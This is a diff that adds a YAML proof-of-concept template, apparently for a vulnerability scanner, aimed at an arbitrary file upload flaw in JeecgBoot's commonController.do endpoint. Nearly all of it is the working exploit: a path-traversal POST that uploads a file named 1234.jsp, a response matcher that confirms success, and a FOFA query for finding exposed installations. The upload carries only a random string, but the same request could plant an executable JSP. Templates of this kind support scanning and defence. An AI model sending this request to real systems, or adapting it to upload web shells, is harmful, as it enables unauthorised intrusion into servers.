@@ -1,0 +1,34 @@
+id: poc-yaml-jeecgboot-commoncontroller-do-anyfile-upload
+info:
+  name: Jeecgboot commonController.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: jeecgboot
+  fofa: title=="JeecgBoot 企业级低代码平台"
+variables:
+  t1: random_str(8)
+  path: 'api/../commonController.do?parserXml
+
+    scheduler/api/../commonController.do?parserXml
+
+    '
+requests:
+- method: POST
+  path: /{{.path}}
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.t1}}
+  data: '------WebKitFormBoundary{{.t1}}
+
+    Content-Disposition: form-data; name="file"; filename="1234.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t1}}
+
+    ------WebKitFormBoundary{{.t1}}--'
+  expression: status_code == 200 && contains(body,"attributes") && contains(body,"obj")
+    && contains(body,"success") && contains(body,"jsonStr")
+transport: http
